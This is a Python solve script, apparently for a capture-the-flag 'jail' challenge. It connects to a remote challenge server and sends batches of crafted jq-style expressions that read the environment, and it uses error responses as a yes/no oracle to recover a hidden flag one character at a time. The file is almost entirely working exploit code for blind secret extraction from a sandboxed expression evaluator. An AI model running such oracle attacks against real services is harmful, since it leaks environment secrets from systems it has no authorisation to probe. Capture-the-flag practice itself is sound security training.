import socket
import json
import string
import time
import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def main():
    length = 122
    charset = string.ascii_lowercase + string.digits + "_{}"
    
    flag = ["?"] * length
    flag[0:5] = list("jail{")
    flag[-1] = "}"
    
    # Pre-calculate pruned query plan
    query_plan = [] # list of (pos, char, is_reverse, chain_val, query_expr)
    
    for pos in range(5, length - 1):
        for c in string.ascii_lowercase + string.digits + "_":
            v = ord(c)
            # Forward add
            val_fwd = pos + v
            if val_fwd in CHAINS:
                pred = predicate(CHAINS[val_fwd])
                expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, False, val_fwd, expr))
            
            # Reverse add
            val_rev = (length - 1 - pos) + v
            if val_rev in CHAINS:
                pred = predicate(CHAINS[val_rev])
                expr = f"env|flatten|sort|last|explode|reverse|implode|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, True, val_rev, expr))

    print(f"[+] Total pruned queries in plan: {len(query_plan)} (down from 4,408!)")

    # Connect to remote and query in batches of 64
    s = socket.create_connection(("challs.pyjail.club", 20219), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    buf = b""
    while b"expr: " not in buf:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    buf = buf.split(b"expr: ", 1)[1]

    t0 = time.time()
    batch_size = 64
    matches_found = 0
    
    for offset in range(0, len(query_plan), batch_size):
        batch = query_plan[offset : offset + batch_size]
        exprs = [item[4] for item in batch]
        
        payload = ("\n".join(exprs) + "\n").encode()
        s.sendall(payload)
        
        answers = []
        token_re = solve_remote_live.TOKEN_RE
        while len(answers) < len(exprs):
            m = list(token_re.finditer(buf))
            if m:
                take = min(len(m), len(exprs) - len(answers))
                answers.extend(match.group(1).decode() for match in m[:take])
                buf = buf[m[take - 1].end():]
                if len(answers) == len(exprs):
                    break
                continue
            chunk = s.recv(65536)
            if not chunk: break
            buf += chunk

        for (pos, c, is_rev, val, expr), ans in zip(batch, answers):
            if ans == "error":
                flag[pos] = c
                matches_found += 1
                print(f"[+] pos {pos:3d}: '{c}' (val {val}, rev={is_rev}) -> {''.join(flag)}")

    t1 = time.time()
    s.close()

    print(f"\n[+] Recovered {matches_found} character assignments in {t1 - t0:.2f}s!")
    print(f"[+] RECOVERED FLAG: {''.join(flag)}")

if __name__ == "__main__":
    main()
